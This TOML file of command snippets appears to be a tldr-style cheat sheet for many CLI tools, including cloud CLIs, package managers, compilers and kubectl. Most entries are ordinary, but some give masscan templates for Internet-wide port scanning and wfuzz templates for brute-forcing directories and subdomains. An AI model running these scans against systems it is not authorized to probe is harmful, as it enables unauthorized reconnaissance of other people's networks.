  command = "cs resolve <group_id1>:<artifact_id1>:<artifact_version1> <group_id2>:<artifact_id2>:<artifact_version2>"
  output = ""

[[snippets]]
  description = "Resolve lists of transitive dependencies of a package by the dependency tree"
  command = "cs resolve --tree <group_id>:<artifact_id>:<artifact_version>"
  output = ""

[[snippets]]
  description = "Resolve dependency tree in a reverse order (from a dependency to its dependencies)"
  command = "cs resolve --reverse-tree <group_id>:<artifact_id>:<artifact_version}"
  output = ""

[[snippets]]
  description = "Print all the libraries that depends on a specific library"
  command = "cs resolve <group_id>:<artifact_id>:<artifact_version> --what-depends-on <searched_group_id>:<searched_artifact_id>"
  output = ""

[[snippets]]
  description = "Print all the libraries that depends on a specific library version"
  command = "cs resolve <group_id>:<artifact_id>:<artifact_version> --what-depends-on <searched_group_id>:<searched_artifact_id><searched_artifact_version>"
  output = ""

[[snippets]]
  description = "Print eventual conflicts between a set of packages"
  command = "cs resolve --conflicts <group_id1:artifact_id1:artifact_version1 group_id2:artifact_id2:artifact_version2 ...>"
  output = ""

[[snippets]]
  description = "List running batch jobs"
  command = "aws batch list-jobs --job-queue <queue_name>"
  output = ""

[[snippets]]
  description = "Create compute environment"
  command = "aws batch create-compute-environment --compute-environment-name <compute_environment_name> --type <type>"
  output = ""

[[snippets]]
  description = "Create batch job queue"
  command = "aws batch create-job-queue --job-queue-name <queue_name> --priority <priority> --compute-environment-order <compute_environment>"
  output = ""

[[snippets]]
  description = "Submit job"
  command = "aws batch submit-job --job-name <job_name> --job-queue <job_queue> --job-definition <job_definition>"
  output = ""

[[snippets]]
  description = "Describe the list of batch jobs"
  command = "aws batch describe-jobs --jobs <jobs>"
  output = ""

[[snippets]]
  description = "Cancel job"
  command = "aws batch cancel-job --job-id <job_id> --reason <reason>"
  output = ""

[[snippets]]
  description = "Parse a project"
  command = "doctum parse"
  output = ""

[[snippets]]
  description = "Render a project"
  command = "doctum render"
  output = ""

[[snippets]]
  description = "Parse then render a project"
  command = "doctum update"
  output = ""

[[snippets]]
  description = "Parse and render only a specific version of a project"
  command = "doctum update --only-version=<version>"
  output = ""

[[snippets]]
  description = "Parse and render a project using a specific configuration"
  command = "doctum update <path/to/config.php>"
  output = ""

[[snippets]]
  description = "Show the status of all tasks"
  command = "pueue status"
  output = ""

[[snippets]]
  description = "Show the status of a specific group"
  command = "pueue status --group <group_name>"
  output = ""

[[snippets]]
  description = "Log out from the active account"
  command = "az logout"
  output = ""

[[snippets]]
  description = "Log out a specific username"
  command = "az logout --username <alias@somedomain.com>"
  output = ""

[[snippets]]
  description = "Display general help"
  command = "cargo help"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "cargo help <subcommand>"
  output = ""

[[snippets]]
  description = "List all available products"
  command = "eol"
  output = ""

[[snippets]]
  description = "Get EoLs of one or more products"
  command = "eol <product1 product2 ...>"
  output = ""

[[snippets]]
  description = "Open the product webpage"
  command = "eol <product> --web"
  output = ""

[[snippets]]
  description = "Get EoLs of a one or more products in a specific format"
  command = "eol <product1 product2 ...> --format <html|json|md|markdown|pretty|rst|csv|tsv|yaml>"
  output = ""

[[snippets]]
  description = "Get EoLs of one or more products as a single markdown file"
  command = "eol <product1 product2 ...> --format <markdown> > <eol_report.md>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "eol --help"
  output = ""

[[snippets]]
  description = "Start the daemon"
  command = "auditd"
  output = ""

[[snippets]]
  description = "Start the daemon in debug mode"
  command = "auditd -d"
  output = ""

[[snippets]]
  description = "Start the daemon on-demand from launchd"
  command = "auditd -l"
  output = ""

[[snippets]]
  description = "Convert a DocBook XML document to PDF format"
  command = "xmlto <pdf> <document.xml>"
  output = ""

[[snippets]]
  description = "Convert a DocBook XML document to HTML format and store the resulting files in a separate directory"
  command = "xmlto -o <path/to/html_files> <html> <document.xml>"
  output = ""

[[snippets]]
  description = "Convert a DocBook XML document to a single HTML file"
  command = "xmlto <html-nochunks> <document.xml>"
  output = ""

[[snippets]]
  description = "Specify a stylesheet to use while converting a DocBook XML document"
  command = "xmlto -x <stylesheet.xsl> <output_format> <document.xml>"
  output = ""

[[snippets]]
  description = "Launch the vim tutor using the given language (en, fr, de, ...)"
  command = "vimtutor <language>"
  output = ""

[[snippets]]
  description = "Exit the tutor"
  command = "<Esc> :q <Enter>"
  output = ""

[[snippets]]
  description = "Install one or more package into the currently active conda environment"
  command = "conda install <package1 package2 ...>"
  output = ""

[[snippets]]
  description = "Install a single package into the currently active conda environment using channel conda-forge"
  command = "conda install -c conda-forge <package>"
  output = ""

[[snippets]]
  description = "Install a single package into the currently active conda environment using channel conda-forge and ignoring other channels"
  command = "conda install -c conda-forge --override-channels <package>"
  output = ""

[[snippets]]
  description = "Install a specific version of a package"
  command = "conda install <package>=<version>"
  output = ""

[[snippets]]
  description = "Install a package into a specific environment"
  command = "conda install --name <environment> <package>"
  output = ""

[[snippets]]
  description = "Update a package in the current environment"
  command = "conda install --upgrade <package>"
  output = ""

[[snippets]]
  description = "Install a package and agree to the transactions without prompting"
  command = "conda install --yes <package>"
  output = ""

[[snippets]]
  description = "Start with nix expression in `shell.nix` or `default.nix` in the current directory"
  command = "nix-shell"
  output = ""

[[snippets]]
  description = "Run shell command in non-interactive shell and exit"
  command = "nix-shell --run ""<command> <argument1 argument2 ...>"""
  output = ""

[[snippets]]
  description = "Start with expression in `default.nix` in the current directory"
  command = "nix-shell <default.nix>"
  output = ""

[[snippets]]
  description = "Start with packages loaded from nixpkgs"
  command = "nix-shell --packages <package1 package2 ...>"
  output = ""

[[snippets]]
  description = "Start with packages loaded from specific nixpkgs revision"
  command = "nix-shell --packages <package1 package2 ...> -I nixpkgs=<https://github.com/NixOS/nixpkgs/archive/nixpkgs_revision.tar.gz>"
  output = ""

[[snippets]]
  description = "Evaluate rest of file in specific interpreter, for use in `#!-scripts` (see <https://nixos.org/manual/nix/stable/#use-as-a-interpreter>)"
  command = "nix-shell -i <interpreter> --packages <package1 package2 ...>"
  output = ""

[[snippets]]
  description = "Create a new bug report file in the current directory"
  command = "git bugreport"
  output = ""

[[snippets]]
  description = "Create a new bug report file in the specified directory, creating it if it does not exist"
  command = "git bugreport --output-directory <path/to/directory>"
  output = ""

[[snippets]]
  description = "Create a new bug report file with the specified filename suffix in `strftime` format"
  command = "git bugreport --suffix <%m%d%y>"
  output = ""

[[snippets]]
  description = "Initialize (or re-encrypt) the storage using one or more GPG IDs"
  command = "pass init <gpg_id_1> <gpg_id_2>"
  output = ""

[[snippets]]
  description = "Save a new password and additional information (press Ctrl + D on a new line to complete)"
  command = "pass insert --multiline <path/to/data>"
  output = ""

[[snippets]]
  description = "Edit an entry"
  command = "pass edit <path/to/data>"
  output = ""

[[snippets]]
  description = "Copy a password (first line of the data file) to the clipboard"
  command = "pass -c <path/to/data>"
  output = ""

[[snippets]]
  description = "List the whole store tree"
  command = "pass"
  output = ""

[[snippets]]
  description = "Generate a new random password with a given length, and copy it to the clipboard"
  command = "pass generate -c <path/to/data> <num>"
  output = ""

[[snippets]]
  description = "Initialize a new Git repository (any changes done by pass will be committed automatically)"
  command = "pass git init"
  output = ""

[[snippets]]
  description = "Run a Git command on behalf of the password storage"
  command = "pass git <command>"
  output = ""

[[snippets]]
  description = "Install pre-commit into your Git hooks"
  command = "pre-commit install"
  output = ""

[[snippets]]
  description = "Run pre-commit hooks on all staged files"
  command = "pre-commit run"
  output = ""

[[snippets]]
  description = "Run pre-commit hooks on all files, staged or unstaged"
  command = "pre-commit run --all-files"
  output = ""

[[snippets]]
  description = "Clean pre-commit cache"
  command = "pre-commit clean"
  output = ""

[[snippets]]
  description = "Invoke `cmp` on two files compressed via `gzip`"
  command = "zcmp <path/to/file1.gz> <path/to/file2.gz>"
  output = ""

[[snippets]]
  description = "Compare a file to its gzipped version (assuming `.gz` exists already)"
  command = "zcmp <path/to/file>"
  output = ""

[[snippets]]
  description = "Produce a PPM file of the specified pattern with the specified dimensions"
  command = "ppmpat -<gingham2|gingham3|madras|tartan|poles|...> <width> <height> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Produce a PPM file of a camo pattern using the specified colors"
  command = "ppmpat -camo -color <color1,color2,...> <width> <height> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Decrypt a file using a specified key, key ring, and location"
  command = "gcloud kms decrypt --key=<key_name> --keyring=<keyring_name> --location=<global> --ciphertext-file=<path/to/ciphertext> --plaintext-file=<path/to/plaintext>"
  output = ""

[[snippets]]
  description = "Decrypt a file with additional authenticated data (AAD) and write the decrypted plaintext to `stdout`"
  command = "gcloud kms decrypt --key=<key_name> --keyring=<keyring_name> --location=<global> --additional-authenticated-data-file=<path/to/file.aad> --ciphertext-file=<path/to/ciphertext> --plaintext-file=-"
  output = ""

[[snippets]]
  description = "Scan an IP or network subnet for port 80"
  command = "masscan <ip_address|network_prefix> --ports <80>"
  output = ""

[[snippets]]
  description = "Scan a class B subnet for the top 100 ports at 100,000 packets per second"
  command = "masscan <10.0.0.0/16> --top-ports <100> --rate <100000>"
  output = ""

[[snippets]]
  description = "Scan a class B subnet avoiding ranges from a specific exclude file"
  command = "masscan <10.0.0.0/16> --top-ports <100> --excludefile <path/to/file>"
  output = ""

[[snippets]]
  description = "Scan the Internet for port 443"
  command = "masscan <0.0.0.0/0> --ports <443> --rate <10000000>"
  output = ""

[[snippets]]
  description = "Scan the Internet for a specific port range and export to a file"
  command = "masscan <0.0.0.0/0> --ports <0-65535> -output-format <binary|grepable|json|list|xml> --output-filename <path/to/file>"
  output = ""

[[snippets]]
  description = "Quit the bar"
  command = "polybar-msg cmd quit"
  output = ""

[[snippets]]
  description = "Restart the bar in-place"
  command = "polybar-msg cmd restart"
  output = ""

[[snippets]]
  description = "Hide the bar (does nothing if the bar is already hidden)"
  command = "polybar-msg cmd hide"
  output = ""

[[snippets]]
  description = "Show the bar again (does nothing if the bar is not hidden)"
  command = "polybar-msg cmd show"
  output = ""

[[snippets]]
  description = "Toggle between hidden/visible"
  command = "polybar-msg cmd toggle"
  output = ""

[[snippets]]
  description = "Execute a module action (the data string is optional)"
  command = "polybar-msg action ""#<module_name>.<action_name>.<data_string>"""
  output = ""

[[snippets]]
  description = "Only send messages to a specific Polybar instance (all instances by default)"
  command = "polybar-msg -p <pid> <cmd|action> <payload>"
  output = ""

[[snippets]]
  description = "List all hosted zones, private and public"
  command = "aws route53 list-hosted-zones"
  output = ""

[[snippets]]
  description = "Show all records in a zone"
  command = "aws route53 list-resource-record-sets --hosted-zone-id <zone_id>"
  output = ""

[[snippets]]
  description = "Create a new, public zone using a request identifier to retry the operation safely"
  command = "aws route53 create-hosted-zone --name <name> --caller-reference <request_identifier>"
  output = ""

[[snippets]]
  description = "Delete a zone (if the zone has non-defaults SOA and NS records the command will fail)"
  command = "aws route53 delete-hosted-zone --id <zone_id>"
  output = ""

[[snippets]]
  description = "Test DNS resolving by Amazon servers of a given zone"
  command = "aws route53 test-dns-answer --hosted-zone-id <zone_id> --record-name <name> --record-type <type>"
  output = ""

[[snippets]]
  description = "Start Bird with a specific configuration file"
  command = "bird -c <path/to/bird.conf>"
  output = ""

[[snippets]]
  description = "Start Bird as a specific user and group"
  command = "bird -u <username> -g <group>"
  output = ""

[[snippets]]
  description = "Show the default layout (CPU, memory, temperatures, disk, network, and processes)"
  command = "btm"
  output = ""

[[snippets]]
  description = "Enable basic mode, removing charts and condensing data (similar to `top`)"
  command = "btm --basic"
  output = ""

[[snippets]]
  description = "Use big dots instead of small ones in charts"
  command = "btm --dot_marker"
  output = ""

[[snippets]]
  description = "Show also battery charge and health status"
  command = "btm --battery"
  output = ""

[[snippets]]
  description = "Refresh every 250 milliseconds and show the last 30 seconds in the charts"
  command = "btm --rate 250 --default_time_value 30000"
  output = ""

[[snippets]]
  description = "Align the data of a ZIP file on 4-byte boundaries"
  command = "zipalign <4> <path/to/input.zip> <path/to/output.zip>"
  output = ""

[[snippets]]
  description = "Check that a ZIP file is correctly aligned on 4-byte boundaries and display the results in a verbose manner"
  command = "zipalign -v -c <4> <path/to/input.zip>"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "elvish"
  output = ""

[[snippets]]
  description = "Execute specific [c]ommands"
  command = "elvish -c ""<echo 'elvish is executed'>"""
  output = ""

[[snippets]]
  description = "Execute a specific script"
  command = "elvish <path/to/script.elv>"
  output = ""

[[snippets]]
  description = "Replace any commit with a different one, leaving other commits unchanged"
  command = "git replace <object> <replacement>"
  output = ""

[[snippets]]
  description = "Delete existing replace refs for the given objects"
  command = "git replace --delete <object>"
  output = ""

[[snippets]]
  description = "Edit an object’s content interactively"
  command = "git replace --edit <object>"
  output = ""

[[snippets]]
  description = "Compile a source code file into an executable binary"
  command = "ldc2 <path/to/source.d> -of=<path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Compile the source code file without linking"
  command = "ldc2 -c <path/to/source.d>"
  output = ""

[[snippets]]
  description = "Select the target architecture and OS"
  command = "ldc -mtriple=<architecture_OS> -c <path/to/source.d>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "ldc2 -h"
  output = ""

[[snippets]]
  description = "Display complete help"
  command = "ldc2 -help-hidden"
  output = ""

[[snippets]]
  description = "Download the contents of a URL to a file"
  command = "curl <http://example.com> --output <path/to/file>"
  output = ""

[[snippets]]
  description = "Download a file, saving the output under the filename indicated by the URL"
  command = "curl --remote-name <http://example.com/filename>"
  output = ""

[[snippets]]
  description = "Download a file, following location redirects, and automatically continuing (resuming) a previous file transfer and return an error on server error"
  command = "curl --fail --remote-name --location --continue-at - <http://example.com/filename>"
  output = ""

[[snippets]]
  description = "Send form-encoded data (POST request of type `application/x-www-form-urlencoded`). Use `--data @file_name` or `--data @'-'` to read from STDIN"
  command = "curl --data <'name=bob'> <http://example.com/form>"
  output = ""

[[snippets]]
  description = "Send a request with an extra header, using a custom HTTP method"
  command = "curl --header <'X-My-Header: 123'> --request <PUT> <http://example.com>"
  output = ""

[[snippets]]
  description = "Send data in JSON format, specifying the appropriate content-type header"
  command = "curl --data <'{""name"":""bob""}'> --header <'Content-Type: application/json'> <http://example.com/users/1234>"
  output = ""

[[snippets]]
  description = "Pass a username and prompt for a password to authenticate to the server"
  command = "curl --user <username> <http://example.com>"
  output = ""

[[snippets]]
  description = "Pass client certificate and key for a resource, skipping certificate validation"
  command = "curl --cert <client.pem> --key <key.pem> --insecure <https://example.com>"
  output = ""

[[snippets]]
  description = "Stop embedded nbd server"
  command = "qm nbdstop <VM_ID>"
  output = ""

[[snippets]]
  description = "Unfreeze one or more specified stages"
  command = "dvc unfreeze <stage_name1 stage_name2 ...>"
  output = ""

[[snippets]]
  description = "Update the database to a specified migration"
  command = "dotnet ef database update <migration>"
  output = ""

[[snippets]]
  description = "Drop the database"
  command = "dotnet ef database drop"
  output = ""

[[snippets]]
  description = "List available `DbContext` types"
  command = "dotnet ef dbcontext list"
  output = ""

[[snippets]]
  description = "Generate code for a `DbContext` and entity types for a database"
  command = "dotnet ef dbcontext scaffold <connection_string> <provider>"
  output = ""

[[snippets]]
  description = "Add a new migration"
  command = "dotnet ef migrations add <name>"
  output = ""

[[snippets]]
  description = "Remove the last migration, rolling back the code changes that were done for the latest migration"
  command = "dotnet ef migrations remove"
  output = ""

[[snippets]]
  description = "List available migrations"
  command = "dotnet ef migrations list"
  output = ""

[[snippets]]
  description = "Generate a SQL script from migrations range"
  command = "dotnet ef migrations script <from_migration> <to_migration>"
  output = ""

[[snippets]]
  description = "List the contents of the tree on a branch"
  command = "git ls-tree <branch_name>"
  output = ""

[[snippets]]
  description = "List the contents of the tree on a commit, recursing into subtrees"
  command = "git ls-tree -r <commit_hash>"
  output = ""

[[snippets]]
  description = "List only the filenames of the tree on a commit"
  command = "git ls-tree --name-only <commit_hash>"
  output = ""

[[snippets]]
  description = "Print the filenames of the current branch head in a tree structure (Note: `tree --fromfile` is not supported on Windows)"
  command = "git ls-tree -r --name-only HEAD | tree --fromfile"
  output = ""

[[snippets]]
  description = "Execute a VboxManage subcommand"
  command = "VBoxManage <subcommand>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "VBoxManage --help"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand"
  command = "VBoxManage --help <clonevm|import|export|startvm|...>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "VBoxManage --version"
  output = ""

[[snippets]]
  description = "Configure for first use"
  command = "notmuch setup"
  output = ""

[[snippets]]
  description = "Add a tag for all messages matching a search term"
  command = "notmuch tag +<custom_tag> ""<search_term>"""
  output = ""

[[snippets]]
  description = "Remove a tag for all messages matching a search term"
  command = "notmuch tag -<custom_tag> ""<search_term>"""
  output = ""

[[snippets]]
  description = "Count messages matching the given search term"
  command = "notmuch count --output=<messages|threads> ""<search_term>"""
  output = ""

[[snippets]]
  description = "Search for messages matching the given search term"
  command = "notmuch search --format=<json|text> --output=<summary|threads|messages|files|tags> ""<search_term>"""
  output = ""

[[snippets]]
  description = "Limit the number of search results to X"
  command = "notmuch search --format=<json|text> --output=<summary|threads|messages|files|tags> --limit=<X> ""<search_term>"""
  output = ""

[[snippets]]
  description = "Create a reply template for a set of messages"
  command = "notmuch reply --format=<default|headers-only> --reply-to=<sender|all> ""<search_term>"""
  output = ""

[[snippets]]
  description = "Install a global tool (don't use `--global` for local tools)"
  command = "dotnet tool install --global <dotnetsay>"
  output = ""

[[snippets]]
  description = "Install tools defined in the local tool manifest"
  command = "dotnet tool restore"
  output = ""

[[snippets]]
  description = "Update a specific global tool (don't use `--global` for local tools)"
  command = "dotnet tool update --global <tool_name>"
  output = ""

[[snippets]]
  description = "Uninstall a global tool (don't use `--global` for local tools)"
  command = "dotnet tool uninstall --global <tool_name>"
  output = ""

[[snippets]]
  description = "List installed global tools (don't use `--global` for local tools)"
  command = "dotnet tool list --global"
  output = ""

[[snippets]]
  description = "Search tools in NuGet"
  command = "dotnet tool search <search_term>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "dotnet tool --help"
  output = ""

[[snippets]]
  description = "Directory and file bruteforce using the specified wordlist and also proxying the traffic"
  command = "wfuzz -w <path/to/file> -p <127.0.0.1:8080> <http://example.com/FUZZ>"
  output = ""

[[snippets]]
  description = "Save the results to a file"
  command = "wfuzz -w <path/to/file> -f <filename> <http://example.com/FUZZ>"
  output = ""

[[snippets]]
  description = "Show colorized output while only showing the declared response codes in the output"
  command = "wfuzz -c -w <path/to/file> --sc <200,301,302> <http://example.com/FUZZ>"
  output = ""

[[snippets]]
  description = "Use a custom header to fuzz subdomains while hiding specific response codes and word counts. Increase the threads to 100 and include the target ip/domain"
  command = "wfuzz -w <path/to/file> -H <""Host: FUZZ.example.com""> --hc <301> --hw <222> -t <100> <example.com>"
  output = ""

[[snippets]]
  description = "Initialize a Satis configuration"
  command = "satis init <satis.json>"
  output = ""

[[snippets]]
  description = "Add a VCS repository to the Satis configuration"
  command = "satis add <repository_url>"
  output = ""

[[snippets]]
  description = "Build the static output from the configuration"
  command = "satis build <satis.json> <path/to/output_directory>"
  output = ""

[[snippets]]
  description = "Build the static output by updating only the specified repository"
  command = "satis build --repository-url <repository_url> <satis.json> <path/to/output_directory>"
  output = ""

[[snippets]]
  description = "Remove useless archive files"
  command = "satis purge <satis.json> <path/to/output_directory>"
  output = ""

[[snippets]]
  description = "Remove job number 10"
  command = "atrm <10>"
  output = ""

[[snippets]]
  description = "Remove many jobs, separated by spaces"
  command = "atrm <15> <17> <22>"
  output = ""

[[snippets]]
  description = "Display key-value pairs of all environment variables"
  command = "printenv"
  output = ""

[[snippets]]
  description = "Display the value of a specific variable"
  command = "printenv <HOME>"
  output = ""

[[snippets]]
  description = "Display the value of a variable and end with NUL instead of newline"
  command = "printenv --null <HOME>"
  output = ""

[[snippets]]
  description = "List all ports"
  command = "netstat --all"
  output = ""

[[snippets]]
  description = "List all listening ports"
  command = "netstat --listening"
  output = ""

[[snippets]]
  description = "List listening TCP ports"
  command = "netstat --tcp"
  output = ""

[[snippets]]
  description = "Display PID and program names"
  command = "netstat --program"
  output = ""

[[snippets]]
  description = "List information continuously"
  command = "netstat --continuous"
  output = ""

[[snippets]]
  description = "List routes and do not resolve IP addresses to hostnames"
  command = "netstat --route --numeric"
  output = ""

[[snippets]]
  description = "List listening TCP and UDP ports (+ user and process if you're root)"
  command = "netstat --listening --program --numeric --tcp --udp --extend"
  output = ""

[[snippets]]
  description = "Get cluster status"
  command = "stolonctl --cluster-name <cluster_name> --store-backend <store_backend> --store-endpoints <store_endpoints> status"
  output = ""

[[snippets]]
  description = "Get cluster data"
  command = "stolonctl --cluster-name <cluster_name> --store-backend <store_backend> --store-endpoints <store_endpoints> clusterdata"
  output = ""

[[snippets]]
  description = "Get cluster specification"
  command = "stolonctl --cluster-name <cluster_name> --store-backend <store_backend> --store-endpoints <store_endpoints> spec"
  output = ""

[[snippets]]
  description = "Update cluster specification with a patch in JSON format"
  command = "stolonctl --cluster-name <cluster_name> --store-backend <store_backend> --store-endpoints <store_endpoints> update --patch '<cluster_spec>'"
  output = ""

[[snippets]]
  description = "Add a reference to the project in the current directory"
  command = "dotnet add reference <path/to/reference.csproj>"
  output = ""

[[snippets]]
  description = "Add a reference to the specific project"
  command = "dotnet add <path/to/project.csproj> reference <path/to/reference.csproj>"
  output = ""

[[snippets]]
  description = "Play a file"
  command = "vlc <path/to/file>"
  output = ""

[[snippets]]
  description = "Play in fullscreen"
  command = "vlc --fullscreen <path/to/file>"
  output = ""

[[snippets]]
  description = "Play muted"
  command = "vlc --no-audio <path/to/file>"
  output = ""

[[snippets]]
  description = "Play repeatedly"
  command = "vlc --loop <path/to/file>"
  output = ""

[[snippets]]
  description = "Play video from a URL"
  command = "vlc <https://www.youtube.com/watch?v=oHg5SJYRHA0>"
  output = ""

[[snippets]]
  description = "Output the information in `warts` files as text"
  command = "sc_warts2text <path/to/file1.warts path/to/file2.warts ...>"
  output = ""

[[snippets]]
  description = "Convert the specified PGM image to Usenix FaceSave format"
  command = "pgmtofs <path/to/input.pgm> > <path/to/output.fs>"
  output = ""

[[snippets]]
  description = "Compile a source code file into an executable binary"
  command = "g++ <path/to/source.cpp> -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Display common warnings"
  command = "g++ <path/to/source.cpp> -Wall -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Choose a language standard to compile for (C++98/C++11/C++14/C++17)"
  command = "g++ <path/to/source.cpp> -std=<c++98|c++11|c++14|c++17> -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Include libraries located at a different path than the source file"
  command = "g++ <path/to/source.cpp> -o <path/to/output_executable> -I<path/to/header> -L<path/to/library> -l<library_name>"
  output = ""

[[snippets]]
  description = "Compile and link multiple source code files into an executable binary"
  command = "g++ -c <path/to/source1.cpp path/to/source2.cpp ...> && g++ -o <path/to/output_executable> <path/to/source1.o path/to/source2.o ...>"
  output = ""

[[snippets]]
  description = "Optimize the compiled program for performance"
  command = "g++ <path/to/source.cpp> -O<1|2|3|fast> -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "g++ --version"
  output = ""

[[snippets]]
  description = "Perform a highstate on this minion"
  command = "salt-call state.highstate"
  output = ""

[[snippets]]
  description = "Perform a highstate dry-run, compute all changes but don't actually perform them"
  command = "salt-call state.highstate test=true"
  output = ""

[[snippets]]
  description = "Perform a highstate with verbose debugging output"
  command = "salt-call -l debug state.highstate"
  output = ""

[[snippets]]
  description = "List this minion's grains"
  command = "salt-call grains.items"
  output = ""

[[snippets]]
  description = "Start a sudoku game"
  command = "nudoku"
  output = ""

[[snippets]]
  description = "Choose the difficulty of the game"
  command = "nudoku -d <easy|normal|hard>"
  output = ""

[[snippets]]
  description = "Navigate the board"
  command = "<h|j|k|l> OR <Left|Down|Up|Right arrow key>"
  output = ""

[[snippets]]
  description = "Delete a number"
  command = "<Backspace|x>"
  output = ""

[[snippets]]
  description = "Get a hint"
  command = "H"
  output = ""

[[snippets]]
  description = "See the complete solution"
  command = "S"
  output = ""

[[snippets]]
  description = "Create a new puzzle"
  command = "N"
  output = ""

[[snippets]]
  description = "Quit the game"
  command = "Q"
  output = ""

[[snippets]]
  description = "Display the current month's calendar"
  command = "ical"
  output = ""

[[snippets]]
  description = "Convert a Gregorian date to a Hijri date"
  command = "ical --gregorian <yyyymmdd>"
  output = ""

[[snippets]]
  description = "Convert a Hirji date to a Gregorian date"
  command = "ical --hijri <yyyymmdd>"
  output = ""

[[snippets]]
  description = "Convert a PPM image to a ICR file"
  command = "ppmtoicr <path/to/file.ppm> > <path/to/file.icr>"
  output = ""

[[snippets]]
  description = "Display the output in name"
  command = "ppmtoicr -windowname <name> <path/to/file.ppm> > <path/to/file.icr>"
  output = ""

[[snippets]]
  description = "Expand the image by the specified factor"
  command = "ppmtoicr -expand <factor> <path/to/file.ppm> > <path/to/file.icr>"
  output = ""

[[snippets]]
  description = "Display the output on the screen with the specified number"
  command = "ppmtoicr -display <number> <path/to/file.ppm> > <path/to/file.icr>"
  output = ""

[[snippets]]
  description = "List the stacks in the app"
  command = "cdk ls"
  output = ""

[[snippets]]
  description = "Synthesize and print the CloudFormation template for the specified stack(s)"
  command = "cdk synth <stack_name>"
  output = ""

[[snippets]]
  description = "Deploy one or more stacks"
  command = "cdk deploy <stack_name1 stack_name2 ...>"
  output = ""

[[snippets]]
  description = "Destroy one or more stacks"
  command = "cdk destroy <stack_name1 stack_name2 ...>"
  output = ""

[[snippets]]
  description = "Compare the specified stack with the deployed stack or a local CloudFormation template"
  command = "cdk diff <stack_name>"
  output = ""

[[snippets]]
  description = "Create a new CDK project in the current directory for a specified [l]anguage"
  command = "cdk init -l <language>"
  output = ""

[[snippets]]
  description = "Open the CDK API reference in your browser"
  command = "cdk docs"
  output = ""

[[snippets]]
  description = "Get all namespaces in the current cluster"
  command = "kubectl get namespaces"
  output = ""

[[snippets]]
  description = "Get nodes in a specified [n]amespace"
  command = "kubectl get nodes --namespace <namespace>"
  output = ""

[[snippets]]
  description = "Get pods in a specified [n]amespace"
  command = "kubectl get pods --namespace <namespace>"
  output = ""

[[snippets]]
  description = "Get deployments in a specified [n]amespace"
  command = "kubectl get deployments --namespace <namespace>"
  output = ""

[[snippets]]
  description = "Get services in a specified [n]amespace"
  command = "kubectl get services --namespace <namespace>"
  output = ""

[[snippets]]
  description = "Get all resources in a specified [n]amespace"
  command = "kubectl get all --namespace <namespace>"
  output = ""

[[snippets]]
  description = "Get Kubernetes objects defined in a YAML manifest [f]ile"
  command = "kubectl get --file <path/to/manifest.yaml>"
  output = ""

[[snippets]]
  description = "Create and run a Dev Container"
  command = "devcontainer up"
  output = ""

[[snippets]]
  description = "Apply a Dev Container Template to a workspace"
  command = "devcontainer templates apply --template-id <template_id> --template-args <template_args> --workspace-folder <path/to/workspace>"
  output = ""

[[snippets]]
  description = "Execute a command on a running Dev Container in the current workspace"
  command = "devcontainer exec <command>"
  output = ""

[[snippets]]
  description = "Build a Dev Container image from `devcontainer.json`"
  command = "devcontainer build <path/to/workspace>"
  output = ""

[[snippets]]
  description = "Open a Dev Container in VS Code (the path is optional)"
  command = "devcontainer open <path/to/workspace>"
  output = ""

[[snippets]]
  description = "Read and print the configuration of a Dev Container from `devcontainer.json`"
  command = "devcontainer read-configuration"
  output = ""

[[snippets]]
  description = "Show CPU and hard disk performance data for the hard disk mounted at `/`"
  command = "pveperf"
  output = ""

[[snippets]]
  description = "Use a specific extension (default: `aff`)"
  command = "afconvert -a <extension> <path/to/input_file> <path/to/output_file1 path/to/output_file2 ...>"
  output = ""

[[snippets]]
  description = "Use a specific compression level (default: `7`)"
  command = "afconvert -X<0..7> <path/to/input_file> <path/to/output_file1 path/to/output_file2 ...>"
  output = ""

[[snippets]]
  description = "Print files and directories up to 'num' levels of depth (where 1 means the current directory)"
  command = "tree -L <num>"
  output = ""

[[snippets]]
  description = "Print directories only"
  command = "tree -d"
  output = ""

[[snippets]]
  description = "Print hidden files too with colorization on"
  command = "tree -a -C"
  output = ""

[[snippets]]
  description = "Print the tree without indentation lines, showing the full path instead (use `-N` to not escape non-printable characters)"
  command = "tree -i -f"
  output = ""

[[snippets]]
  description = "Print the size of each file and the cumulative size of each directory, in human-readable format"
  command = "tree -s -h --du"
  output = ""

[[snippets]]
  description = "Print files within the tree hierarchy, using a wildcard (glob) pattern, and pruning out directories that don't contain matching files"
  command = "tree -P '<*.txt>' --prune"
  output = ""

[[snippets]]
  description = "Print directories within the tree hierarchy, using the wildcard (glob) pattern, and pruning out directories that aren't ancestors of the wanted one"
  command = "tree -P <directory_name> --matchdirs --prune"
  output = ""

[[snippets]]
  description = "Print the tree ignoring the given directories"
  command = "tree -I '<directory_name1|directory_name2>'"
  output = ""

[[snippets]]
  description = "Print information about the operating system, shell, PHP, and WP-CLI (`wp`) installation"
  command = "wp --info"
  output = ""

[[snippets]]
  description = "Update WP-CLI"
  command = "wp cli update"
  output = ""

[[snippets]]
  description = "Download a fresh WordPress installation to current directory, optionally specifying the locale"
  command = "wp core download --locale=<locale>"
  output = ""

[[snippets]]
  description = "Create basic `wpconfig` file (assuming database on `localhost`)"
  command = "wp config create --dbname=<dbname> --dbuser=<dbuser> --dbpass=<dbpass>"
  output = ""

[[snippets]]
  description = "Install and activate a WordPress plugin"
  command = "wp plugin install <plugin> --activate"
  output = ""

[[snippets]]
  description = "Replace all instances of a string in the database"
  command = "wp search-replace <old_string> <new_string>"
  output = ""

[[snippets]]
  description = "Import the contents of a WordPress Extended RSS (WXR) file"
  command = "wp import <path/to/file.xml>"
  output = ""

[[snippets]]
  description = "Authorize a Salesforce Organization"
  command = "sf force:auth:web:login --setalias <organization> --instanceurl <organization_url>"
  output = ""

[[snippets]]
  description = "List all authorized organizations"
  command = "sf force:org:list"
  output = ""

